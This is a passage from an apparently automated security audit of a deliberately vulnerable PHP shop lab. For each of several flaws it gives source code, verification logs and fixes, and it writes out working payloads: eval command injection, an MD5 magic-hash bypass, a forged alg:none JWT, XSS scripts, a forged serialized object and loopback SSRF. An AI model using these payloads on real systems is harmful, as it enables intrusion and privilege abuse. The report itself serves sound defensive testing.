- 当前版本：finding `cbc0430810e6455eabc064331bd9a754` revision 1（项目版本 28）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/template-render.php:3`；文件：`lab30-shop/app/public/ops/template-render.php`
- 证据引用：`136d02a92a08ac98` lab30-shop/app/public/ops/template-render.php:1-4；`063c928d2d7c3b2e` lab30-shop/app/src/bootstrap.php:33-40
- 根因类别：task_goal:v2:746bdbf702dde1755381:1（规范类型 code_execution）

**结论陈述（模型产出，不是证据）**

POST template 在 POST 分支经 csrf 校验后被 preg_replace_callback 提取双花括号内容，直接作为 'return '.$m[1].';' 传给 eval，未做表达式白名单或语法限制，任何 operator/admin 会话即可执行任意 PHP 表达式。

- 攻击前身份与适用前提：拥有 operator 或 admin 会话，并取得自身 CSRF token 后 POST template
- 入口 → 传播 → 危险操作/状态变更：$_POST['template'] → $_POST['template'] -> preg_replace_callback 回调参数 $m[1] -> eval('return '.$m[1].';') → eval() 执行攻击者控制的 PHP 表达式
- 防护与边界：require_user(['operator','admin']) 与 check_csrf 仅限制角色与请求来源，不限制表达式内容
- 静态判读：证据已记录
- 动态验证：动态确认（verification `7bdfc66438d24cf39067adedd03bf674`）
- 正式终审：独立批次 cd79527f48334aa0a2220737207ca5bc；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧提交 template={{ system("id;echo EVALMARK_cbc04308") }}：返回 200，响应正文在 doctype 之前出现 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nEVALMARK_cbc04308\n'，<pre> 中为 system() 返回值 'EVALMARK_cbc04308'，全响应 MARKER True。即双花括号内表达式被 eval 执行，system() 以 www-data 权限运行了注入命令。

- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：禁止对用户输入使用 eval；改用受限安全的表达式解析器或预定义模板变量替换，并对 {{...}} 内容做严格白名单。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/template-render.php:1-4`（sha256 `357da9e9959275d8…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$template=(string)($_POST['template']??'');$result='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$result=preg_replace_callback('/\{\{(.*?)\}\}/s',function($m){return (string)eval('return '.$m[1].';');},$template);}
    4  page('营销内容排版',function()use($template,$result){echo '<section class="panel"><p>在双花括号内填写表达式，预览输出内容。</p><form method="post">'.csrf_field().'<label>模板<textarea name="template" required>'.h($template?:'本周精选，共 {{ 2 + 2 }} 款好物').'</textarea></label><button>生成预览</button></form><pre>'.h($result).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-40`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

### C-22 运营 URL 预览 GET url 直接交给 file_get_contents 造成 SSRF

- 当前版本：finding `bc328ee5aef640c58a4a4f22afe0015e` revision 1（项目版本 27）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/url-preview.php:3`；文件：`lab30-shop/app/public/ops/url-preview.php`
- 证据引用：`17e1cacfb5189678` lab30-shop/app/public/ops/url-preview.php:2-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:6f5dea7a01836b51c013:1（规范类型 ssrf）

**结论陈述（模型产出，不是证据）**

url-preview.php:2 把 $_GET['url'] 直接转字符串，无协议/主机白名单或内网校验；第3行将其传入 file_get_contents，结果在第4行 h($output) 回显。仅 follow_location=0 与 4 秒超时，不阻止访问回环/内网/元数据地址或其它流包装器。

- 攻击前身份与适用前提：持有 operator 或 admin 会话，访问 /ops/url-preview.php?url=<目标地址>
- 入口 → 传播 → 危险操作/状态变更：GET 参数 url（operator/admin 会话） → $_GET['url'] -> (string) -> $url -> file_get_contents($url,...) -> $value -> h($output) 输出到 <pre> → file_get_contents 以攻击者控制的 URL 发起服务端请求
- 防护与边界：仅 require_user 角色门禁与超时/不跟随跳转；无协议白名单、私网/回环过滤或解析后 IP 校验
- 静态判读：证据已记录
- 动态验证：动态确认（verification `7b3b3608fd2446ba90f67fa1c1d30fef`）
- 正式终审：独立批次 cd79527f48334aa0a2220737207ca5bc；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧 GET /ops/url-preview.php?url=http://127.0.0.1:80/ 返回 200，<pre> 中出现服务端从回环地址取回的商城首页 HTML（经 h() 转义为 &lt;!doctype html&gt;…&lt;title&gt;让每一份日常，都值得期待 · 拾光商城&lt;/title&gt;…），LOOPBACK_SHOP True；http://localhost:80/ 同样返回首页 HTML（LOOPBACK2_SHOP True）。即 operator 可控 URL 被 file_get_contents 在服务器侧向回环地址发起请求并回显响应。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：限制协议为 http/https，解析后拒绝私网/回环地址，或改用预置目标白名单

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/url-preview.php:2-4`（sha256 `e495938b10c455c6…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$url=(string)($_GET['url']??'');$output='';
    3  if($url!==''){$context=stream_context_create(['http'=>['timeout'=>4,'follow_location'=>0]]);$value=@file_get_contents($url,false,$context,0,65536);$output=$value===false?'暂时无法获取该地址。':$value;}
    4  page('链接预览',function()use($url,$output){echo '<section class="panel"><form method="get">';form_input('url','内容地址',$url?:'http://fixtures:8080/catalog-info');echo '<button>读取预览</button></form><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-23 account/redeem.php 使用 == 比较 MD5，弱类型绕过兑换码免费升级金卡

- 当前版本：finding `5a0a00576fa249cfb5ad3466c54cf27f` revision 1（项目版本 20）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/redeem.php:5`；文件：`lab30-shop/app/public/account/redeem.php`
- 证据引用：`80ea2098674d64d9` lab30-shop/app/public/account/redeem.php:2-6
- 根因类别：task_goal:v2:90b9012355422c577bd5:1（规范类型 weak_type_comparison）

**结论陈述（模型产出，不是证据）**

redeem.php 第 4 行 $secret_hash=md5('240610708') 得到 0e462097431906509019562988736854，第 5 行判断 md5((string)$_POST['token'])==$secret_hash 使用宽松比较；当提交的 token 其 MD5 以 0e 开头且后续全为数字（如某些已知魔法值）时，两侧都被当作 0 而相等，无需知道真实兑换码即可通过并执行 UPDATE users SET tier='gold'。

- 攻击前身份与适用前提：已登录普通账户 + 同页 CSRF token（若秘钥哈希非 0e 前缀则不可绕过，需适应实际值）
- 入口 → 传播 → 危险操作/状态变更：POST 字段 token → $_POST['token'] -> md5() -> == 与 0e 前缀哈希宽松比较 -> 真分支 -> UPDATE users SET tier='gold' → UPDATE users SET tier='gold' WHERE id=<当前用户>
- 防护与边界：check_csrf 仅防跨站；比较使用 == 而非 hash_equals/===，弱类型可绕过
- 静态判读：证据已记录
- 动态验证：动态确认（verification `68f88c599e974fcaace48aa481a4ae3c`）
- 正式终审：独立批次 cd79527f48334aa0a2220737207ca5bc；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧提交 token=QNKCDZO：其 md5 为 0e830400451993494058024219903391（MAGIC_MD5），服务端返回 200 {"accepted":true,"message":"兑换成功，已升级金卡会员。"}；随后当前用户 JSON 显示 tier 由 standard 变为 "gold"（宿主 state_changes 记录 tier standard→gold）。而服务端秘钥哈希为 md5('240610708')=0e462097431906509019562988736854，二者均为 0e 前缀全数字字符串，宽松比较下都被当作 0 而相等。

- 评分依据：CVSS 3.1 Base 3.1 (low) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 hash_equals() 或 === 比较 md5，并使用随机高强度兑换码配合服务端存储与一次性核销。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/redeem.php:2-6`（sha256 `28b3dc4534cca985…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$notice='';$accepted=false;
    3  if($_SERVER['REQUEST_METHOD']==='POST'){
    4      check_csrf();$secret_hash=md5('240610708');
    5      if(md5((string)($_POST['token']??''))==$secret_hash){db()->prepare("UPDATE users SET tier='gold' WHERE id=?")->execute([$u['id']]);event_log('redeem_membership');$notice='兑换成功，已升级金卡会员。';$accepted=true;}
    6      else{$notice='兑换码无效。';http_response_code(422);}
```

## 5. 实际验证和终审理由

### C-01 account/update.php 批量赋值允许登录用户将自身 role/balance 改写（提权与余额篡改）

- verification `527664d39fc849c687a649bbdda28f1a`（finding `618fed4dab94434c9f2d11308ca4829e` revision 1，context `a509d9f5fe7540eb9e7219317a5fbc4a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：同一作业开始时的登录/当前用户 JSON 为 role=customer、balance=100.00（普通会员初始态）；随后以带 csrf 的合法字段 POST display_name=norm，请求成功返回 200 资料页，最终 JSON 中 display_name 已为 norm，证明只含合法字段的更新被正常接受，而 role/balance 未被该请求触及。
  - 攻击侧观测：同一 alice 会话中，附加隐藏字段提交 role=admin&balance=999999（csrf 取自真实表单）后，读取当前用户 JSON 变为 id=1、username=alice、display_name=norm、email=alice@shop.local、role=admin、balance=999999.00、tier=standard。普通会员通过 $_POST 白名单内的 role/balance 字段把自身改为管理员并篡改余额；update.php:5 把所有白名单键直接加入 SET 子句，未做字段级授权限制，update.php:6 以参数化方式执行该 UPDATE（仅防注入，不防字段越权）。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`7b5388e689de4c529b066cab7418525e`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`7b5388e689de4c529b066cab7418525e` script finished exit=0
  - 适配脚本：`527664d3-adapted-mass_assignment_update.py`（见证据包 evidence/）
  - 备注：宿主审计作业 7b5388e689de4c529b066cab7418525e（identity=alice，exit_code=0，evidence_usable=true）stdout 原文包含三段：LOGIN 时 role=customer/balance=100.00；NORMAL 为 display_name=norm 的合法请求返回资料页；ATTACK 后 /account/me.php 返回 role=admin/balance=999999.00。postcondition 的 identity_or_role_mismatch 正是攻击成功的直接结果（角色已被改写），不是实验失败。状态变化记录 balance 100.00→999999.00、role customer→admin。源码 update.php:4-6 与 bootstrap.php:33-37、53 证明 role 决定运营入口/权限判定；未使用 operator/admin 身份，攻击者为普通会员。注意：该实验已把共享库中 alice 改为 admin，后续若需普通会员前提应以宿主复位或 bob 核对。

- 正式复核 `6c7f7771a8d84bf297fd1a895ba3543e`：复核确认；引用 revision 1 / verification `527664d39fc849c687a649bbdda28f1a`
  - 理由：读取完整两侧观测：正常侧作业开始登录 JSON 为 role=customer、balance=100.00，仅提交合法字段 display_name=norm 返回 200 资料页且 role/balance 未被触及；攻击侧同一 alice 会话附加隐藏字段 role=admin&balance=999999 并携带真实表单 csrf 后，当前用户 JSON 变为 role=admin、balance=999999.00。normal_observation 与 attack_observation 均在 state_changes 中留有 balance 与 role 的前后值，与 update.php:4-6 白名单拼接 UPDATE 的源码一致，确认字段级越权成立。
  - 复核观测：正常侧 同一作业开始时的登录/当前用户 JSON 为 role=customer、balance=100.00（普通会员初始态）；随后以带 csrf 的合法字段 POST display_name=norm，请求成功返回 200 资料页，最终 JSON 中 display_name 已为 norm，证明只含合法字段的更新被正常接受，而 role/balance 未被该请求触及。；攻击侧 同一 alice 会话中，附加隐藏字段提交 role=admin&balance=999999（csrf 取自真实表单）后，读取当前用户 JSON 变为 id=1、username=alice、display_name=norm、email=alice@shop.local、role=admin、balance=999999.00、tier=standard。普通会员通过 $_POST 白名单内的 role/balance 字段把自身改为管理员并篡改余额；update.php:5 把所有白名单键直接加入 SET 子句，未做字段级授权限制，update.php:6 以参数化方式执行该 UPDATE（仅防注入，不防字段越权）。

### C-02 template-preview.php 远程文件包含：include 直接使用用户 template 参数且 allow_url_include=On

- verification `e6f298c9f79841d59a03567c9e92d624`（finding `633719c82cd64d56bc043d63f5b5df83` revision 1，context `e9e8e017364f48e0ac613cb364a523c5`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：operator 登录后访问不带 template 的 /ops/template-preview.php 返回 200，页面仅渲染表单，remote-template 区块为空字符串，不含远端内容；对照 role 前提，customer（alice）访问同一路径返回 403，说明该功能限 operator/admin，与源码 require_user(['operator','admin']) 一致。
  - 攻击侧观测：攻击侧（operator 会话）：GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 200，远端内容被 include 并执行，remote-template 区块实际渲染出 '<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>'，页面中不含字面量 '<?php'；而 fixtures/server.py:17 显示该 URL 的原始响应体就是这段 PHP 源码，故渲染结果只能来自服务端包含并执行远端 PHP。另以 template=http://fixtures:8080/catalog-info 返回 200，remote-template 区块为远端纯文本“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”，说明 include 目标 URL 完全由请求参数决定，服务端会向任意给定地址发起包含请求。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`d6e01493f40640d0806f1b630b83b16a`；`62754524b96e4bec8d0093668888f97c`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`62754524b96e4bec8d0093668888f97c` script finished exit=0；`d6e01493f40640d0806f1b630b83b16a` script finished exit=0
  - 适配脚本：`e6f298c9-adapted-rfi_template_poc_python.py`（见证据包 evidence/）
  - 备注：作业 62754524b96e4bec8d0093668888f97c（identity=operator，exit_code=0，evidence_usable=true）stdout：OPERATOR_SESSION 200（未回登录页）；NORMAL_NO_TEMPLATE 200 且 remote-template 区为空；REMOTE_SEASON_PHP 200 且 HAS_LITERAL_PHP False、HAS_SEASON_MARKUP True；REMOTE_CATALOG_INFO 200 且区块为远端摘要文本。源码 template-preview.php:2 仅 require_user(['operator','admin']) 后取 $_GET['template']，:3 直接 include $template，无协议/主机/路径校验；php.ini:3 allow_url_include=On、allow_url_fopen=On；fixtures/server.py:16-17 证明 season.php 的响应体是 PHP 源码文本。角色前提由宿主导入作业 d6e01493f40640d0806f1b630b83b16a 佐证：alice（customer）对同一入口两次请求均 403，与源码要求 operator/admin 一致；ope…

- 正式复核 `f3f0a978a1eb460bbbafdfb89c8e0ef0`：复核确认；引用 revision 1 / verification `e6f298c9f79841d59a03567c9e92d624`
  - 理由：读取完整两侧观测：正常侧 operator 不带 template 访问 /ops/template-preview.php 返回 200 且 remote-template 区块为空，customer(alice) 访问同一路径 403，符合 require_user(['operator','admin'])；对照作业另一侧对 fixtures URL 的直接请求返回 403，说明渲染内容并非客户端自行获取。攻击侧 operator 传 template=http://fixtures:8080/templates/season.php 返回 200，remote-template 区块渲染出 h2“合作方 · 秋日生活提案”且无字面量 <?php，fixtures/server.py:17 显示该原始响应为 PHP 源码，证明服务端 include 并执行远端 PHP；另传 /catalog-info 也包含远端文本，确认 include 目标完全受控，RFI 成立。
  - 复核观测：正常侧 正常侧：operator 登录后访问不带 template 的 /ops/template-preview.php 返回 200，页面仅渲染表单，remote-template 区块为空字符串，不含远端内容；对照 role 前提，customer（alice）访问同一路径返回 403，说明该功能限 operator/admin，与源码 require_user(['operator','admin']) 一致。；攻击侧 攻击侧（operator 会话）：GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 200，远端内容被 include 并执行，remote-template 区块实际渲染出 '<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>'，页面中不含字面量 '<?php'；而 fixtures/server.py:17 显示该 URL 的原始响应体就是这段 PHP 源码，故渲染结果只能来自服务端包含并执行远端 PHP。另以 template=http://fixtures:8080/catalog-info 返回 200，remote-template 区块为远端纯文本“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”，说明 inclu…

### C-03 partner/portal.php 仅解码 JWT payload 不验签，构造 role=admin 令牌即可越权读取全部订单

- verification `83288ac3d2a4459cadab3af2c227243c`（finding `966576d2146344879dcbedc45dc3fcca` revision 1，context `ef9b76f6b58343ad8a877f3b3173f5d8`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：无令牌 POST /partner/portal.php 返回 BASELINE_NOTOKEN 403 {"error":"此合作方功能仅向管理员开放。"}；使用 /partner/token.php 签发的合法令牌（payload 为 {"sub":1,"role":"customer","name":"alice"}）POST 同样返回 NORMAL_CUSTOMER 403，即普通会员的正规令牌无法访问合作方结算数据。
  - 攻击侧观测：攻击侧用无 cookie、未登录的独立 opener 向 /partner/portal.php POST 自造三段令牌（header=b64url({"alg":"none","typ":"JWT"})，payload=b64url({"role":"admin"}) 即 eyJyb2xlIjoiYWRtaW4ifQ，签名段仅为 'x'）：返回 200，JSON 为 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}（HAS_ORDER True、ROLE_ADMIN True）。服务端未校验签名段与 HMAC 密钥，仅凭 payload 自述 role=admin 即放行并返回全部订单号与金额。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`a710fb4539cd44c0a2901bf389ea864c`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`a710fb4539cd44c0a2901bf389ea864c` script finished exit=0
  - 适配脚本：`83288ac3-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 a710fb4539cd44c0a2901bf389ea864c（identity=alice，exit_code=0，evidence_usable=true）stdout 同时给出四组观测：LEGIT_PAYLOAD 为 token.php 签发的真实令牌 payload {"sub":1,"role":"customer","name":"alice"}；无令牌与合法 customer 令牌均 403；伪造 role=admin 令牌（签名段 'x'）200 并返回 settlements。源码 portal.php:2 取 POST token 或 Cookie 后 explode('.') 仅 base64_decode(json_decode) parts[1]；:3 只检查 is_array 与 role==='admin'；:4 SELECT order_no,total FROM orders；:5 JSON/HTML 输出。token.php:4 显示正规令牌使用 HMAC，但 portal 从不校验签名。攻击者未登录、不持有任何凭据；identity=alice 仅用于取得合法对照令牌，postcondition 仍为 alice/customer。

- 正式复核 `2d656a0156c44ea2af2e5521d4f9dc73`：复核确认；引用 revision 1 / verification `83288ac3d2a4459cadab3af2c227243c`
  - 理由：完整读取两侧观测：正常侧无令牌 POST /partner/portal.php 返回 403 及“此合作方功能仅向管理员开放”，使用 /partner/token.php 为已登录 alice 正常签发的合法令牌（payload 解码为 {"sub":1,"role":"customer","name":"alice"}，签名由 hash_hmac 生成）同样返回 403，MEMBER_SESSION 200 且未因伪造令牌改变身份，说明合法客户身份与缺失令牌均无法越权。攻击侧以无 Cookie 的独立 opener 提交三段自制令牌（header=b64url({"alg":"none"})、payload=b64url({"role":"admin"}) 即 eyJyb2xlIjoiYWRtaW4ifQ、签名段仅为 'x'）返回 200，正文为 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}，HAS_ORDER 与 ROLE_ADMIN 均为真，签名段任意仍被接受，落库的 portal.php:2-3 只解码 parts[1] 并把 role 当作用户声明的源码证据得到动态印证，攻击侧观测成立。执行状态 success、exit_code 0、evidence_usable 证据可用，无失败或环境不可用迹象，未见反证，故确认该验证结论。
  - 复核观测：正常侧 正常侧：无令牌 POST /partner/portal.php 返回 BASELINE_NOTOKEN 403 {"error":"此合作方功能仅向管理员开放。"}；使用 /partner/token.php 签发的合法令牌（payload 为 {"sub":1,"role":"customer","name":"alice"}）POST 同样返回 NORMAL_CUSTOMER 403，即普通会员的正规令牌无法访问合作方结算数据。；攻击侧 攻击侧用无 cookie、未登录的独立 opener 向 /partner/portal.php POST 自造三段令牌（header=b64url({"alg":"none","typ":"JWT"})，payload=b64url({"role":"admin"}) 即 eyJyb2xlIjoiYWRtaW4ifQ，签名段仅为 'x'）：返回 200，JSON 为 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}（HAS_ORDER True、ROLE_ADMIN True）。服务端未校验签名段与 HMAC 密钥，仅凭 payload 自述 role=admin 即放行并返回全部订单号与金额。

### C-04 support/messages.php 留言内容未编码导致存储型 XSS

- verification `f5237eca53984a20a3e3202acd001a93`（finding `43b0838f093d472c9143038ec56e1e96` revision 1，context `eae1089ac2d743de9b439962cc8fc692`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：攻击前 browser_check 加载 /support/messages.php：status finished、title 在线留言、dialogs=[]、console_errors=[]，body_text 仅含两条正常历史留言（陈远：请问帆布包可以机洗吗？；林晓：包装很好，期待下次上新。），无任何脚本执行。
  - 攻击侧观测：alice 先 GET /support/messages.php 取真实 csrf，再 POST message=<script>alert('XSS43b0838f')</script>；服务端参数化 INSERT 后 303 回到留言页，返回 HTML 中原样出现 <div class="message-body"><script>alert('XSS43b0838f')</script></div>（PAYLOAD_RAW_IN_PAGE True）。随后浏览器加载 /support/messages.php，实际弹出 dialog，dialogs=["XSS43b0838f"]，console_errors 为空，即脚本在受害者浏览页面时执行。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`8cc9cfc0a55440d1b0df811a884b959f`；`8cecf68180544f918a9f414dd929cf71`；`ed2b0c413ce24263a937ae1699f4e7d2`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`8cc9cfc0a55440d1b0df811a884b959f` browser finished exit=0；`8cecf68180544f918a9f414dd929cf71` script finished exit=0；`ed2b0c413ce24263a937ae1699f4e7d2` browser finished exit=0
  - 产物：`f5237eca53984a20a3e3202acd001a93-8cc9cfc0a55440d1b0df811a884b959f-screenshot.png`；`f5237eca53984a20a3e3202acd001a93-ed2b0c413ce24263a937ae1699f4e7d2-screenshot.png`
  - 适配脚本：`f5237eca-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常侧 job 8cc9cfc0a55440d1b0df811a884b959f：browser_check 加载 /support/messages.php，dialogs=[]，仅显示两条正常历史留言。攻击侧 job 8cecf68180544f918a9f414dd929cf71：脚本以 alice 登录、真实 csrf 提交 payload，返回页面原文证明未编码输出；job ed2b0c413ce24263a937ae1699f4e7d2：同一浏览器会话加载页面，dialogs 记录 XSS43b0838f，截图 artifact 1f02874a... 为执行时弹窗画面。源码引用 messages.php:3（参数化 INSERT，仅长度/CSRF 校验）与第5行（.$row['message']. 直接拼接，未用 h()）与动态观测一致。未使用特权身份；XSS 影响为任何登录用户访问留言页即触发。

- 正式复核 `9c2fecc18aa84dd0afc22dcda63257b6`：复核确认；引用 revision 1 / verification `f5237eca53984a20a3e3202acd001a93`
  - 理由：完整读取两侧观测：正常侧 /support/messages.php 仅显示两条普通历史留言、dialogs 与 console_errors 均为空；攻击侧 alice 用真实 csrf 提交含 <script> 的留言后返回页面原样包含该脚本且浏览器实际弹出 XSS43b0838f，与 messages.php:2-5 未编码输出根因一致，确认存储型 XSS。
  - 复核观测：正常侧 攻击前 browser_check 加载 /support/messages.php：status finished、title 在线留言、dialogs=[]、console_errors=[]，body_text 仅含两条正常历史留言（陈远：请问帆布包可以机洗吗？；林晓：包装很好，期待下次上新。），无任何脚本执行。；攻击侧 alice 先 GET /support/messages.php 取真实 csrf，再 POST message=<script>alert('XSS43b0838f')</script>；服务端参数化 INSERT 后 303 回到留言页，返回 HTML 中原样出现 <div class="message-body"><script>alert('XSS43b0838f')</script></div>（PAYLOAD_RAW_IN_PAGE True）。随后浏览器加载 /support/messages.php，实际弹出 dialog，dialogs=["XSS43b0838f"]，console_errors 为空，即脚本在受害者浏览页面时执行。

### C-05 catalog/greeting.php 的 name 参数未编码导致反射型 XSS

- verification `4f7927f03e3e49a385c4f0c68a0b9cff`（finding `5d49941ea36b4c14aaba5cec95eb33ce` revision 1，context `ad4b23794d004a2fa8cddbf64b2f9957`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：攻击前 browser_check 加载 /catalog/greeting.php：status finished、title 到店欢迎、dialogs=[]、console_errors=[]，body_text 显示“你好，拾光的朋友”，无脚本执行。
  - 攻击侧观测：访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27XSS5d49941e%27%29%3C%2Fscript%3E，浏览器实际弹出 dialog：dialogs=["XSS5d49941e"]，console_errors=[]；页面 body_text 在“你好，”后为空（script 被解析执行而非作为文本显示），即 $_GET['name'] 未经 h() 编码直接进入 <h2> 并被浏览器执行。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`4c281842a5f2430e8f2520ba2cc01539`；`bedc54f3a9bd4d45849676dc158f3111`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`4c281842a5f2430e8f2520ba2cc01539` browser finished exit=0；`bedc54f3a9bd4d45849676dc158f3111` browser finished exit=0
  - 产物：`4f7927f03e3e49a385c4f0c68a0b9cff-4c281842a5f2430e8f2520ba2cc01539-screenshot.png`；`4f7927f03e3e49a385c4f0c68a0b9cff-bedc54f3a9bd4d45849676dc158f3111-screenshot.png`
  - 备注：正常侧 job 4c281842a5f2430e8f2520ba2cc01539：browser_check 加载 /catalog/greeting.php，dialogs=[]，正文为“你好，拾光的朋友”。攻击侧 job bedc54f3a9bd4d45849676dc158f3111：同一浏览器会话加载带 name 参数的 URL（url_encode 编码后的 payload），dialogs 记录 XSS5d49941e，截图 artifact 4de689fb... 为弹窗画面。源码 greeting.php:2 仅 (string) 转换、第3行 .$name. 直接拼接，未用已定义的 h()（bootstrap.php:10），与动态执行一致。payload 的 <script> 标签在服务端 HTML 中原样反射，浏览器解析执行；无需登录的公开页面，受害者点击链接即触发。

- 正式复核 `acad7aa8cc964f55bf7262916824c2b4`：复核确认；引用 revision 1 / verification `4f7927f03e3e49a385c4f0c68a0b9cff`
  - 理由：完整读取两侧观测：正常侧 greeting.php 显示“你好，拾光的朋友”、无 dialog；攻击侧带 URL 编码 <script>alert('XSS5d49941e')</script> 的 name 参数使浏览器弹出该 dialog 且页面文本中 name 位置为空，与 greeting.php:2-3 未调用 h() 根因一致，确认反射型 XSS。
  - 复核观测：正常侧 攻击前 browser_check 加载 /catalog/greeting.php：status finished、title 到店欢迎、dialogs=[]、console_errors=[]，body_text 显示“你好，拾光的朋友”，无脚本执行。；攻击侧 访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27XSS5d49941e%27%29%3C%2Fscript%3E，浏览器实际弹出 dialog：dialogs=["XSS5d49941e"]，console_errors=[]；页面 body_text 在“你好，”后为空（script 被解析执行而非作为文本显示），即 $_GET['name'] 未经 h() 编码直接进入 <h2> 并被浏览器执行。

### C-06 会员备份恢复对 POST 数据直接 unserialize 导致 PHP 对象注入

- verification `9f82013c84b34113815d19b0df3c6c99`（finding `e4c0d7fa5c0640dbb7e81a774b02ae04` revision 1，context `2d38b3321ec54d7690b290ac3cfbd753`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：从 /account/backup.php 取得应用自己生成的导出 EXPORT0 = O:12:"MemberBackup":2:{s:4:"tier";s:8:"standard";s:11:"displayName";s:6:"林晓";}，带真实 csrf 提交恢复，返回 RESTORE_NORMAL 200 且页面含“会员备份已恢复”；再次读取导出 EXPORT1 与 EXPORT0 完全相同（tier 仍 standard、displayName 仍林晓），即合法备份恢复不改变状态。
  - 攻击侧观测：攻击侧提交伪造的序列化对象（base64: TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7...）即 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}。服务端返回 RESTORE_ATTACK 200 且含“会员备份已恢复”；随后重新 GET 备份页并解析导出，得到 EXPORT2 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}，说明攻击者指定的属性已被 unserialize 并写入 users（宿主 postcondition 记录 tier standard→gold）。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`8187497743884ed9aae3dafe2ff596ce`；`59f76c140c544bbea5458e9af666ea82`；`ef280c26553d4455bb9d1c9a0b8eb106`
  - 结论结束原因：completed；执行阶段结束原因：未记录
